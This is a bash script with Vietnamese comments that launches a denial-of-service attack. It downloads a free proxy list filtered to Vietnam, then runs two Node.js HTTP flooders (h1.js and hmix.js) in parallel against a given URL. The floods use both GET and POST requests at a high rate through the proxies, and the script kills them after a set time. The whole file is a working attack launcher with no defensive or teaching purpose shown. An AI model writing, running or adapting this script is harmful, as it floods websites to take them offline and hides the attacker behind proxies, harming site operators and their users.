#!/bin/bash

[ $# -lt 2 ] && echo "Usage: $0 URL TIME" && exit 1

URL="$1"
TIME="$2"
THREADS=10
RATE=999
PFILE="hihi.txt"

# Tải proxy 1 lần
curl -s 'https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text&country=vn&ssl=all&anonymity=all&timeout=9999' | sort -u > live.txt

# Chạy tấn công song song cho GET và POST
for METHOD in GET POST; do
    node h1.js "$METHOD" "$URL" live.txt "$TIME" "$RATE" "$THREADS" randomstring=true &
    PIDS+=($!)
    node hmix.js -m "$METHOD" -u "$URL" -s "$TIME" -p "$PFILE" -t "$THREADS" -r "$RATE" --full true -d false &
    PIDS+=($!)
done

# Đợi và kill sau TIME
sleep "$TIME"
kill -9 "${PIDS[@]}" 2>/dev/null
